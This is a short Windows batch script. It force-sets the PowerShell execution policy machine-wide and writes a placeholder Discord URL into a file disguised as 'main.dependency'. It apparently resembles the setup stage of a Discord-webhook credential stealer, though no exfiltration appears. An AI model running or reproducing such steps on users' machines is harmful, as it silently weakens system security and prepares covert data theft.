@echo OFF
powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"
set "URL=discord_url_here"
mkdir "%USERPROFILE%\Source" 2>nul
echo %URL% > "%USERPROFILE%\Source\main.dependency"